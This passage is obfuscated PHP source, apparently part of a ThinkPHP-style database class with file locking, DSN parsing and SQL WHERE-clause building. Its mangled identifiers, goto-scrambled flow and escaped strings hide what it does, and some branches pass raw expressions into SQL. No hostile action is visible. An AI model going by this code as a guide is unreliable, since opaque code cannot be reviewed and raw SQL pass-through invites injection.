write_log($b“Èøœõ¯è[768] . $FšÍ„¹Æ¬Ù, $b“Èøœõ¯è[767]); } self::fileUnlockAll(); } public static function fileLock($C‚‘•‹‘¹É) { goto A‘¥¢¡ÔßÓ; A‘¥¢¡ÔßÓ: $A–¡„ğ¹Ú… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$GLOBALS[$A–¡„ğ¹Ú…[769]]) { $GLOBALS[$A–¡„ğ¹Ú…[769]] = array(); } $GLOBALS[$A–¡„ğ¹Ú…[769]][$C‚‘•‹‘¹É] = !1; goto cÊ“ÖÇ¹²¡; CÜšãÕ¹»: return !1; goto câ‹£î¤ß; bÍë„œ…Ì: if (flock($A¶äÈˆÜ‚£, LOCK_EX)) { return !0; } self::unlock($C‚‘•‹‘¹É); show_json($A–¡„ğ¹Ú…[772], !1); goto CÜšãÕ¹»; cÊ“ÖÇ¹²¡: $A¶äÈˆÜ‚£ = fopen(DATA_PATH . $C‚‘•‹‘¹É . $A–¡„ğ¹Ú…[770], $A–¡„ğ¹Ú…[771]); if (!$A¶äÈˆÜ‚£) { return !1; } $GLOBALS[$A–¡„ğ¹Ú…[769]][$C‚‘•‹‘¹É] = $A¶äÈˆÜ‚£; goto bÍë„œ…Ì; câ‹£î¤ß: } public static function fileUnlock($eõ¨âËÃå) { $dœ“Ä”‚ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D•Ñæ»¦ˆ± = $GLOBALS[$dœ“Ä”‚ó[769]][$eõ¨âËÃå]; if (!$D•Ñæ»¦ˆ±) { return; } $GLOBALS[$dœ“Ä”‚ó[769]][$eõ¨âËÃå] = !1; flock($D•Ñæ»¦ˆ±, LOCK_UN); fclose($D•Ñæ»¦ˆ±); } public static function fileUnlockAll() { $c³ô­‰ƒ£Ù =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$GLOBALS[$c³ô­‰ƒ£Ù[769]]) { return; } foreach ($GLOBALS[$c³ô­‰ƒ£Ù[769]] as $A´‹ç«•Ä» => $DöñÏµµ‘) { if (!$DöñÏµµ‘) { continue; } $GLOBALS[$c³ô­‰ƒ£Ù[769]][$A´‹ç«•Ä»] = !1; flock($DöñÏµµ‘, LOCK_UN); fclose($DöñÏµµ‘); } $GLOBALS[$c³ô­‰ƒ£Ù[769]] = array(); } } goto Eë»®ß´É; ağ·ŠÃ ö•: class DbSqlite3 extends DbSqlite3Base { public function query($f‚ìÏÎ¿) { $C»İƒŒ‘Õ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!CacheLock::fileLock($C»İƒŒ‘Õ[9])) { return !1; } $C¢ËÇÃà = parent::query($f‚ìÏÎ¿); CacheLock::fileUnLock($C»İƒŒ‘Õ[9]); return $C¢ËÇÃà; } public function execute($fÆ™šÚ×öÂ) { $Eˆ­Ï¶˜½ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!CacheLock::fileLock($Eˆ­Ï¶˜½[9])) { return !1; } $bãÁáíã¡¤ = parent::execute($fÆ™šÚ×öÂ); CacheLock::fileUnLock($Eˆ­Ï¶˜½[9]); return $bãÁáíã¡¤; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\156\x65\x71" => "\74\x3e", "\x67\164" => "\76", "\145\x67\164" => "\x3e\75", "\x6c\x74" => "\x3c", "\x65\154\164" => "\x3c\x3d", "\x6e\157\164\154\151\x6b\145" => "\x4e\x4f\124\x20\x4c\x49\x4b\x45", "\x6c\x69\x6b\x65" => "\x4c\x49\113\105", "\x69\156" => "\x49\116", "\156\x6f\164\x69\x6e" => "\x4e\x4f\124\40\111\x4e", "\x6e\157\x74\x20\x69\x6e" => "\116\117\124\40\x49\116", "\142\145\x74\167\145\x65\x6e" => "\102\x45\x54\x57\105\105\116", "\x6e\x6f\x74\142\x65\164\x77\145\x65\156" => "\116\x4f\x54\40\x42\105\124\x57\x45\105\116", "\156\x6f\x74\x20\x62\x65\164\167\x65\145\156" => "\x4e\117\x54\x20\102\105\124\127\105\105\116"); protected $selectSql = "\x53\105\x4c\x45\x43\x54\x25\104\x49\123\124\111\116\103\124\x25\x20\45\x46\x49\105\114\104\45\x20\x46\x52\x4f\x4d\x20\45\x54\x41\102\114\x45\45\x25\112\117\111\116\x25\45\127\x48\x45\x52\105\x25\x25\x47\122\117\125\x50\45\x25\110\101\x56\111\x4e\107\45\x25\117\x52\104\x45\x52\45\45\114\x49\x4d\111\x54\x25\40\x25\x55\116\111\x4f\x4e\x25\x25\x43\117\115\115\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $AÉÆ®á‡ƒ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][871], $AÉÆ®á‡ƒ); } public function factory($aìàÅŸÒ¬ = '') { goto F ‘ä™©Ê¥; c ê³ƒÒÇƒ: $this->dbType = ucwords(strtolower($aìàÅŸÒ¬[$Cß¬›‡Ã®Î[872]])); $eºµâï„ğÀ = $Cß¬›‡Ã®Î[874] . $this->dbType; if (class_exists($eºµâï„ğÀ)) { $F¤Üš”‰ = new $eºµâï„ğÀ($aìàÅŸÒ¬); if ($Cß¬›‡Ã®Î[717] != strtolower($aìàÅŸÒ¬[$Cß¬›‡Ã®Î[872]])) { $F¤Üš”‰->dbType = strtoupper($this->dbType); } else { $F¤Üš”‰->dbType = $this->_getDsnType($aìàÅŸÒ¬[$Cß¬›‡Ã®Î[827]]); } } else { think_exception(think_lang($Cß¬›‡Ã®Î[875]) . $Cß¬›‡Ã®Î[876] . $eºµâï„ğÀ); } goto CÆ«ÆªÌ•½; CÆ«ÆªÌ•½: return $F¤Üš”‰; goto fĞ¹¤³‡ôò; F ‘ä™©Ê¥: $Cß¬›‡Ã®Î =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aìàÅŸÒ¬ = $this->parseConfig($aìàÅŸÒ¬); if (empty($aìàÅŸÒ¬[$Cß¬›‡Ã®Î[872]])) { think_exception(think_lang($Cß¬›‡Ã®Î[873])); } goto c ê³ƒÒÇƒ; fĞ¹¤³‡ôò: } public function __call($A¡†ê·Ù™è, $fÏ‡†˜æš) { if (method_exists($this, $A¡†ê·Ù™è)) { return call_user_func_array(array($this, $A¡†ê·Ù™è), $fÏ‡†˜æš); } } protected function _getDsnType($c¾â–ÔãÇ) { $e¦‘ó«æ‘ = explode($_SERVER[ó¬â¥‰ÊÔ¤Ç£][4], $c¾â–ÔãÇ); $bæÉÉÏíï = strtoupper(trim($e¦‘ó«æ‘[0])); return $bæÉÉÏíï; } private function parseConfig($c“±„íĞˆ = '') { $AÍ«º‚“Ü› =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!empty($c“±„íĞˆ) && is_string($c“±„íĞˆ)) { $c“±„íĞˆ = $this->parseDSN($c“±„íĞˆ); } elseif (is_array($c“±„íĞˆ)) { $c“±„íĞˆ = array_change_key_case($c“±„íĞˆ); $c“±„íĞˆ = array($AÍ«º‚“Ü›[872] => $c“±„íĞˆ[$AÍ«º‚“Ü›[716]], $AÍ«º‚“Ü›[800] => $c“±„íĞˆ[$AÍ«º‚“Ü›[877]], $AÍ«º‚“Ü›[801] => $c“±„íĞˆ[$AÍ«º‚“Ü›[878]], $AÍ«º‚“Ü›[798] => $c“±„íĞˆ[$AÍ«º‚“Ü›[879]], $AÍ«º‚“Ü›[799] => $c“±„íĞˆ[$AÍ«º‚“Ü›[880]], $AÍ«º‚“Ü›[17] => $c“±„íĞˆ[$AÍ«º‚“Ü›[881]], $AÍ«º‚“Ü›[827] => $c“±„íĞˆ[$AÍ«º‚“Ü›[718]], $AÍ«º‚“Ü›[13] => isset($c“±„íĞˆ[$AÍ«º‚“Ü›[882]]) ? $c“±„íĞˆ[$AÍ«º‚“Ü›[882]] : array()); } elseif (empty($c“±„íĞˆ)) { if (think_config($AÍ«º‚“Ü›[883]) && $AÍ«º‚“Ü›[717] != strtolower(think_config($AÍ«º‚“Ü›[884]))) { $c“±„íĞˆ = $this->parseDSN(think_config($AÍ«º‚“Ü›[883])); } else { $c“±„íĞˆ = array($AÍ«º‚“Ü›[872] => think_config($AÍ«º‚“Ü›[884]), $AÍ«º‚“Ü›[800] => think_config($AÍ«º‚“Ü›[885]), $AÍ«º‚“Ü›[801] => think_config($AÍ«º‚“Ü›[886]), $AÍ«º‚“Ü›[798] => think_config($AÍ«º‚“Ü›[887]), $AÍ«º‚“Ü›[799] => think_config($AÍ«º‚“Ü›[888]), $AÍ«º‚“Ü›[17] => think_config($AÍ«º‚“Ü›[242]), $AÍ«º‚“Ü›[827] => think_config($AÍ«º‚“Ü›[883]), $AÍ«º‚“Ü›[13] => think_config($AÍ«º‚“Ü›[889])); } } return $c“±„íĞˆ; } protected function initConnect($Fåùìæ„„ó = true) { if (1 == think_config($_SERVER[ó¬â¥‰ÊÔ¤Ç£][18])) { $this->_linkID = $this->multiConnect($Fåùìæ„„ó); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Då°ƒÄ’¡ => $f¨ˆ‚øÛ) { $this->_linkID = $f¨ˆ‚øÛ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($b´¢šÃƒÏÛ = false) { $Dé¤ñÀÒÏï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; static $F‡“Ô±‰µ = array(); if (empty($F‡“Ô±‰µ)) { foreach ($this->config as $c·„Å×ƒÉ¦ => $dÌØğÄŒ”) { $F‡“Ô±‰µ[$c·„Å×ƒÉ¦] = explode($Dé¤ñÀÒÏï[47], $dÌØğÄŒ”); } } if (think_config($Dé¤ñÀÒÏï[890])) { if ($b´¢šÃƒÏÛ) { $a¾«Ş¢³‚Á = floor(mt_rand(0, think_config($Dé¤ñÀÒÏï[891]) - 1)); } else { if (is_numeric(think_config($Dé¤ñÀÒÏï[892]))) { $a¾«Ş¢³‚Á = think_config($Dé¤ñÀÒÏï[892]); } else { $a¾«Ş¢³‚Á = floor(mt_rand(think_config($Dé¤ñÀÒÏï[891]), count($F‡“Ô±‰µ[$Dé¤ñÀÒÏï[798]]) - 1)); } } } else { $a¾«Ş¢³‚Á = floor(mt_rand(0, count($F‡“Ô±‰µ[$Dé¤ñÀÒÏï[798]]) - 1)); } $E‹Ïô™Ö•Ê = array($Dé¤ñÀÒÏï[800] => isset($F‡“Ô±‰µ[$Dé¤ñÀÒÏï[800]][$a¾«Ş¢³‚Á]) ? $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[800]][$a¾«Ş¢³‚Á] : $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[800]][0], $Dé¤ñÀÒÏï[801] => isset($F‡“Ô±‰µ[$Dé¤ñÀÒÏï[801]][$a¾«Ş¢³‚Á]) ? $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[801]][$a¾«Ş¢³‚Á] : $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[801]][0], $Dé¤ñÀÒÏï[798] => isset($F‡“Ô±‰µ[$Dé¤ñÀÒÏï[798]][$a¾«Ş¢³‚Á]) ? $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[798]][$a¾«Ş¢³‚Á] : $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[798]][0], $Dé¤ñÀÒÏï[799] => isset($F‡“Ô±‰µ[$Dé¤ñÀÒÏï[799]][$a¾«Ş¢³‚Á]) ? $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[799]][$a¾«Ş¢³‚Á] : $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[799]][0], $Dé¤ñÀÒÏï[17] => isset($F‡“Ô±‰µ[$Dé¤ñÀÒÏï[17]][$a¾«Ş¢³‚Á]) ? $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[17]][$a¾«Ş¢³‚Á] : $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[17]][0], $Dé¤ñÀÒÏï[827] => isset($F‡“Ô±‰µ[$Dé¤ñÀÒÏï[827]][$a¾«Ş¢³‚Á]) ? $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[827]][$a¾«Ş¢³‚Á] : $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[827]][0], $Dé¤ñÀÒÏï[13] => isset($F‡“Ô±‰µ[$Dé¤ñÀÒÏï[13]][$a¾«Ş¢³‚Á]) ? $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[13]][$a¾«Ş¢³‚Á] : $F‡“Ô±‰µ[$Dé¤ñÀÒÏï[13]][0]); return $this->connect($E‹Ïô™Ö•Ê, $a¾«Ş¢³‚Á); } public function parseDSN($F‹›¤œ˜Â) { $CÌ•ôÙÂ¡” =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($F‹›¤œ˜Â)) { return !1; } $c”ÓÕŠ¹ = parse_url($F‹›¤œ˜Â); if ($c”ÓÕŠ¹[$CÌ•ôÙÂ¡”[174]]) { $F‹ÚÒ”³öà = array($CÌ•ôÙÂ¡”[872] => $c”ÓÕŠ¹[$CÌ•ôÙÂ¡”[174]], $CÌ•ôÙÂ¡”[800] => isset($c”ÓÕŠ¹[$CÌ•ôÙÂ¡”[551]]) ? $c”ÓÕŠ¹[$CÌ•ôÙÂ¡”[551]] : $CÌ•ôÙÂ¡”[33], $CÌ•ôÙÂ¡”[801] => isset($c”ÓÕŠ¹[$CÌ•ôÙÂ¡”[893]]) ? $c”ÓÕŠ¹[$CÌ•ôÙÂ¡”[893]] : $CÌ•ôÙÂ¡”[33], $CÌ•ôÙÂ¡”[798] => isset($c”ÓÕŠ¹[$CÌ•ôÙÂ¡”[175]]) ? $c”ÓÕŠ¹[$CÌ•ôÙÂ¡”[175]] : $CÌ•ôÙÂ¡”[33], $CÌ•ôÙÂ¡”[799] => isset($c”ÓÕŠ¹[$CÌ•ôÙÂ¡”[176]]) ? $c”ÓÕŠ¹[$CÌ•ôÙÂ¡”[176]] : $CÌ•ôÙÂ¡”[33], $CÌ•ôÙÂ¡”[17] => isset($c”ÓÕŠ¹[$CÌ•ôÙÂ¡”[75]]) ? substr($c”ÓÕŠ¹[$CÌ•ôÙÂ¡”[75]], 1) : $CÌ•ôÙÂ¡”[33]); } else { preg_match($CÌ•ôÙÂ¡”[894], trim($F‹›¤œ˜Â), $E¤¡¹ïêŠ‚); $F‹ÚÒ”³öà = array($CÌ•ôÙÂ¡”[872] => $E¤¡¹ïêŠ‚[1], $CÌ•ôÙÂ¡”[800] => $E¤¡¹ïêŠ‚[2], $CÌ•ôÙÂ¡”[801] => $E¤¡¹ïêŠ‚[3], $CÌ•ôÙÂ¡”[798] => $E¤¡¹ïêŠ‚[4], $CÌ•ôÙÂ¡”[799] => $E¤¡¹ïêŠ‚[5], $CÌ•ôÙÂ¡”[17] => $E¤¡¹ïêŠ‚[6]); } $F‹ÚÒ”³öà[$CÌ•ôÙÂ¡”[827]] = $CÌ•ôÙÂ¡”[33]; return $F‹ÚÒ”³öà; } protected function debug() { $f×¡Öªµ©ä =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $f×¡Öªµ©ä[895]; if (think_config($f×¡Öªµ©ä[896])) { think_status($f×¡Öªµ©ä[897]); think_trace($this->queryStr . $f×¡Öªµ©ä[898] . think_status($f×¡Öªµ©ä[20], $f×¡Öªµ©ä[897], 6) . $f×¡Öªµ©ä[899], $f×¡Öªµ©ä[33], $f×¡Öªµ©ä[900]); } } protected function parseLock($bØÜ‘Êå£ = false) { $F ¨­Ï¼Şƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$bØÜ‘Êå£) { return $F ¨­Ï¼Şƒ[33]; } if ($F ¨­Ï¼Şƒ[829] == $this->dbType) { return $F ¨­Ï¼Şƒ[901]; } return $F ¨­Ï¼Şƒ[902]; } protected function parseSet($Fƒİ‹Î—ª) { $C‚óÆÁÂ’Ï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; foreach ($Fƒİ‹Î—ª as $béì¤šÖ¤ => $cˆ±¢ƒÒç) { if (is_array($cˆ±¢ƒÒç) && $C‚óÆÁÂ’Ï[293] == $cˆ±¢ƒÒç[0]) { $F‰Êùšá‘[] = $this->parseKey($béì¤šÖ¤) . $C‚óÆÁÂ’Ï[903] . $cˆ±¢ƒÒç[1]; } elseif (is_scalar($cˆ±¢ƒÒç) || is_null($cˆ±¢ƒÒç)) { $F‰Êùšá‘[] = $this->parseKey($béì¤šÖ¤) . $C‚óÆÁÂ’Ï[903] . $this->parseValue($cˆ±¢ƒÒç); } } return $C‚óÆÁÂ’Ï[904] . implode($C‚óÆÁÂ’Ï[47], $F‰Êùšá‘); } protected function bindParam($e»à…ÆÕ‘, $a‡¥ìå‰¯³) { $this->bind[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][4] . $e»à…ÆÕ‘] = $a‡¥ìå‰¯³; } protected function parseBind($Cö¶®„ÏÒŒ) { $Cö¶®„ÏÒŒ = array_merge($this->bind, $Cö¶®„ÏÒŒ); $this->bind = array(); return $Cö¶®„ÏÒŒ; } function parseKey(&$Fâ·™Š¥Æ, $D©‘ÒÅ½­É = true) { if ($D©‘ÒÅ½­É) { $Fâ·™Š¥Æ = $this->parseKeyCheck($Fâ·™Š¥Æ); } return $Fâ·™Š¥Æ; } function parseKeyCheck($A¤êªëäº) { $E¥ò¨ŞÃ¹‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A¤êªëäº = trim($A¤êªëäº); if (!preg_match($E¥ò¨ŞÃ¹‹[905], $A¤êªëäº)) { think_exception($E¥ò¨ŞÃ¹‹[906] . $A¤êªëäº); } return $A¤êªëäº; } protected function parseValue($fåá‹ç–Ñ) { $d¢®ñÈÒ­ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (is_string($fåá‹ç–Ñ)) { $fåá‹ç–Ñ = $d¢®ñÈÒ­[868] . $this->escapeString($fåá‹ç–Ñ) . $d¢®ñÈÒ­[868]; } elseif (isset($fåá‹ç–Ñ[0]) && is_string($fåá‹ç–Ñ[0]) && strtolower($fåá‹ç–Ñ[0]) == $d¢®ñÈÒ­[293]) { $fåá‹ç–Ñ = $this->escapeString($fåá‹ç–Ñ[1]); } elseif (is_array($fåá‹ç–Ñ)) { $fåá‹ç–Ñ = array_map(array($this, $d¢®ñÈÒ­[869]), $fåá‹ç–Ñ); } elseif (is_bool($fåá‹ç–Ñ)) { $fåá‹ç–Ñ = $fåá‹ç–Ñ ? $d¢®ñÈÒ­[86] : $d¢®ñÈÒ­[486]; } elseif (is_null($fåá‹ç–Ñ)) { $fåá‹ç–Ñ = $d¢®ñÈÒ­[102]; } return $fåá‹ç–Ñ; } protected function parseField($CÚ’«ÄÊ¾Æ) { $e‡±”ì˜Š‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (is_string($CÚ’«ÄÊ¾Æ) && strpos($CÚ’«ÄÊ¾Æ, $e‡±”ì˜Š‰[47])) { $CÚ’«ÄÊ¾Æ = explode($e‡±”ì˜Š‰[47], $CÚ’«ÄÊ¾Æ); } if (is_array($CÚ’«ÄÊ¾Æ)) { $E°ß…ÚŞ°¹ = array(); foreach ($CÚ’«ÄÊ¾Æ as $D±ÔˆªÓÖ’ => $fÄÊéÔ¦Ç) { if (!is_numeric($D±ÔˆªÓÖ’)) { $E°ß…ÚŞ°¹[] = $this->parseKey($D±ÔˆªÓÖ’) . $e‡±”ì˜Š‰[907] . $this->parseKey($fÄÊéÔ¦Ç); } else { $E°ß…ÚŞ°¹[] = $this->parseKey($fÄÊéÔ¦Ç); } } $E‚Êáº½®Ê = implode($e‡±”ì˜Š‰[47], $E°ß…ÚŞ°¹); } elseif (is_string($CÚ’«ÄÊ¾Æ) && !empty($CÚ’«ÄÊ¾Æ)) { $E‚Êáº½®Ê = $CÚ’«ÄÊ¾Æ; } else { $E‚Êáº½®Ê = $e‡±”ì˜Š‰[182]; } return $E‚Êáº½®Ê; } protected function parseTable($a ë¿±›ô) { $Fî½‡â—óŠ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (is_array($a ë¿±›ô)) { $c„¸äí¿ÌÇ = array(); foreach ($a ë¿±›ô as $a—Ò˜ùË¼ò => $Cò¼‚ÑŒôÂ) { if (!is_numeric($a—Ò˜ùË¼ò)) { $c„¸äí¿ÌÇ[] = $this->parseKey($a—Ò˜ùË¼ò) . $Fî½‡â—óŠ[50] . $this->parseKey($Cò¼‚ÑŒôÂ); } else { $c„¸äí¿ÌÇ[] = $this->parseKey($a—Ò˜ùË¼ò); } } $a ë¿±›ô = $c„¸äí¿ÌÇ; } elseif (is_string($a ë¿±›ô)) { if (strstr($a ë¿±›ô, $Fî½‡â—óŠ[50])) { return $a ë¿±›ô; } $a ë¿±›ô = explode($Fî½‡â—óŠ[47], $a ë¿±›ô); array_walk($a ë¿±›ô, array($this, $Fî½‡â—óŠ[818])); } return $Fî½‡â—óŠ[812] . trim(implode($Fî½‡â—óŠ[908], $a ë¿±›ô), $Fî½‡â—óŠ[377]) . $Fî½‡â—óŠ[812]; } protected function parseWhere($fÍŠÖë÷äÕ) { $FÈğ²åÌ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F¯×»¬ÓŠ = $FÈğ²åÌ[33]; if (is_string($fÍŠÖë÷äÕ)) { $F¯×»¬ÓŠ = $fÍŠÖë÷äÕ; } else { $FçêÇ”ªŒ­ = isset($fÍŠÖë÷äÕ[$FÈğ²åÌ[909]]) ? strtoupper($fÍŠÖë÷äÕ[$FÈğ²åÌ[909]]) : $FÈğ²åÌ[33]; if (in_array($FçêÇ”ªŒ­, array($FÈğ²åÌ[910], $FÈğ²åÌ[911], $FÈğ²åÌ[912]))) { $FçêÇ”ªŒ­ = $FÈğ²åÌ[50] . $FçêÇ”ªŒ­ . $FÈğ²åÌ[50]; unset($fÍŠÖë÷äÕ[$FÈğ²åÌ[909]]); } else { $FçêÇ”ªŒ­ = $FÈğ²åÌ[913]; } foreach ($fÍŠÖë÷äÕ as $F¼ÂÌ¿§„ => $Fá±½šé…) { $F¯×»¬ÓŠ .= $FÈğ²åÌ[273]; if (is_numeric($F¼ÂÌ¿§„)) { $F¼ÂÌ¿§„ = $FÈğ²åÌ[914]; } if (0 === strpos($F¼ÂÌ¿§„, $FÈğ²åÌ[70])) { $F¯×»¬ÓŠ .= $this->parseThinkWhere($F¼ÂÌ¿§„, $Fá±½šé…); } else { if (!preg_match($FÈğ²åÌ[915], trim($F¼ÂÌ¿§„))) { think_exception(think_lang($FÈğ²åÌ[916]) . $FÈğ²åÌ[4] . $F¼ÂÌ¿§„); } $BŠÀ¢Íùä£ = is_array($Fá±½šé…) && isset($Fá±½šé…[$FÈğ²åÌ[917]]); $F¼ÂÌ¿§„ = trim($F¼ÂÌ¿§„); if (strpos($F¼ÂÌ¿§„, $FÈğ²åÌ[279])) { $F¸¡‘ÙÛ³è = explode($FÈğ²åÌ[279], $F¼ÂÌ¿§„); $d¾…ÆÁÁÊÂ = array(); foreach ($F¸¡‘ÙÛ³è as $F’ÁäÏì => $EÃµäªÅØ) { $f©•á±ì† = $BŠÀ¢Íùä£ ? $Fá±½šé…[$F’ÁäÏì] : $Fá±½šé…; $d¾…ÆÁÁÊÂ[] = $FÈğ²åÌ[256] . $this->parseWhereItem($this->parseKey($EÃµäªÅØ), $f©•á±ì†) . $FÈğ²åÌ[817]; } $F¯×»¬ÓŠ .= implode($FÈğ²åÌ[918], $d¾…ÆÁÁÊÂ); } elseif (strpos($F¼ÂÌ¿§„, $FÈğ²åÌ[280])) { $F¸¡‘ÙÛ³è = explode($FÈğ²åÌ[280], $F¼ÂÌ¿§„); $d¾…ÆÁÁÊÂ = array(); foreach ($F¸¡‘ÙÛ³è as $F’ÁäÏì => $EÃµäªÅØ) { $f©•á±ì† = $BŠÀ¢Íùä£ ? $Fá±½šé…[$F’ÁäÏì] : $Fá±½šé…; $d¾…ÆÁÁÊÂ[] = $FÈğ²åÌ[256] . $this->parseWhereItem($this->parseKey($EÃµäªÅØ), $f©•á±ì†) . $FÈğ²åÌ[817]; } $F¯×»¬ÓŠ .= implode($FÈğ²åÌ[913], $d¾…ÆÁÁÊÂ); } else { $F¯×»¬ÓŠ .= $this->parseWhereItem($this->parseKey($F¼ÂÌ¿§„), $Fá±½šé…); } } $F¯×»¬ÓŠ .= $FÈğ²åÌ[274] . $FçêÇ”ªŒ­; } $F¯×»¬ÓŠ = substr($F¯×»¬ÓŠ, 0, -strlen($FçêÇ”ªŒ­)); } return empty($F¯×»¬ÓŠ) ? $FÈğ²åÌ[33] : $FÈğ²åÌ[919] . $F¯×»¬ÓŠ; } protected function parseWhereItem($d ˜®çšÍŒ, $aãçèĞ‚ˆõ) { $d„Ï„êŠàÒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B–ÎÉá½åä = $d„Ï„êŠàÒ[33]; if (is_array($aãçèĞ‚ˆõ)) { if (is_string($aãçèĞ‚ˆõ[0])) { $b³ä‰“”×‚ = strtolower($aãçèĞ‚ˆõ[0]); if (in_array($aãçèĞ‚ˆõ[0], array($d„Ï„êŠàÒ[903], $d„Ï„êŠàÒ[920], $d„Ï„êŠàÒ[921], $d„Ï„êŠàÒ[922], $d„Ï„êŠàÒ[923], $d„Ï„êŠàÒ[924]))) { $B–ÎÉá½åä .= $d ˜®çšÍŒ . $d„Ï„êŠàÒ[50] . $aãçèĞ‚ˆõ[0] . $d„Ï„êŠàÒ[50] . $this->parseValue($aãçèĞ‚ˆõ[1]); } elseif (preg_match($d„Ï„êŠàÒ[925], $aãçèĞ‚ˆõ[0])) { $B–ÎÉá½åä .= $d ˜®çšÍŒ . $d„Ï„êŠàÒ[50] . $this->exp[$b³ä‰“”×‚] . $d„Ï„êŠàÒ[50] . $this->parseValue($aãçèĞ‚ˆõ[1]); } elseif (preg_match($d„Ï„êŠàÒ[926], $aãçèĞ‚ˆõ[0])) { if (is_array($aãçèĞ‚ˆõ[1])) { $FİÒÅäÌ¤º = isset($aãçèĞ‚ˆõ[2]) ? strtoupper($aãçèĞ‚ˆõ[2]) : $d„Ï„êŠàÒ[911]; if (in_array($FİÒÅäÌ¤º, array($d„Ï„êŠàÒ[910], $d„Ï„êŠàÒ[911], $d„Ï„êŠàÒ[912]))) { $bº†·±£Óã = array(); foreach ($aãçèĞ‚ˆõ[1] as $Fİ­ß¢ÇÔÜ) { $bº†·±£Óã[] = $d ˜®çšÍŒ . $d„Ï„êŠàÒ[50] . $this->exp[$b³ä‰“”×‚] . $d„Ï„êŠàÒ[50] . $this->parseValue($Fİ­ß¢ÇÔÜ); } $B–ÎÉá½åä .= $d„Ï„êŠàÒ[256] . implode($d„Ï„êŠàÒ[50] . $FİÒÅäÌ¤º . $d„Ï„êŠàÒ[50], $bº†·±£Óã) . $d„Ï„êŠàÒ[817]; } } else { $B–ÎÉá½åä .= $d ˜®çšÍŒ . $d„Ï„êŠàÒ[50] . $this->exp[$b³ä‰“”×‚] . $d„Ï„êŠàÒ[50] . $this->parseValue($aãçèĞ‚ˆõ[1]); } } elseif ($d„Ï„êŠàÒ[293] == $b³ä‰“”×‚) { $B–ÎÉá½åä .= $d„Ï„êŠàÒ[815] . $d ˜®çšÍŒ . $d„Ï„êŠàÒ[50] . $aãçèĞ‚ˆõ[1] . $d„Ï„êŠàÒ[927]; } elseif (preg_match($d„Ï„êŠàÒ[928], $aãçèĞ‚ˆõ[0])) { $B–ÎÉá½åä .= $aãçèĞ‚ˆõ[0]; } elseif (preg_match($d„Ï„êŠàÒ[929], $aãçèĞ‚ˆõ[0])) { if (isset($aãçèĞ‚ˆõ[2]) && $d„Ï„êŠàÒ[293] == $aãçèĞ‚ˆõ[2]) { $B–ÎÉá½åä .= $d ˜®çšÍŒ . $d„Ï„êŠàÒ[50] . $this->exp[$b³ä‰“”×‚] . $d„Ï„êŠàÒ[50] . $aãçèĞ‚ˆõ[1]; } else { if (is_string($aãçèĞ‚ˆõ[1])) { $aãçèĞ‚ˆõ[1] = explode($d„Ï„êŠàÒ[47], $aãçèĞ‚ˆõ[1]); } $bÎÂ»¢Ù¥ = implode($d„Ï„êŠàÒ[47], $this->parseValue($aãçèĞ‚ˆõ[1])); $B–ÎÉá½åä .= $d ˜®çšÍŒ . $d„Ï„êŠàÒ[50] . $this->exp[$b³ä‰“”×‚] . $d„Ï„êŠàÒ[815] . $bÎÂ»¢Ù¥ . $d„Ï„êŠàÒ[817]; } } elseif (preg_match($d„Ï„êŠàÒ[930], $aãçèĞ‚ˆõ[0])) { $CÒ·…‡êË‡ = is_string($aãçèĞ‚ˆõ[1]) ? explode($d„Ï„êŠàÒ[47], $aãçèĞ‚ˆõ[1]) : $aãçèĞ‚ˆõ[1]; $B–ÎÉá½åä .= $d„Ï„êŠàÒ[815] . $d ˜®çšÍŒ . $d„Ï„êŠàÒ[50] . $this->exp[$b³ä‰“”×‚] . $d„Ï„êŠàÒ[50] . $this->parseValue($CÒ·…‡êË‡[0]) . $d„Ï„êŠàÒ[913] . $this->parseValue($CÒ·…‡êË‡[1]) . $d„Ï„êŠàÒ[274]; } else { think_exception(think_lang($d„Ï„êŠàÒ[916]) . $d„Ï„êŠàÒ[4] . 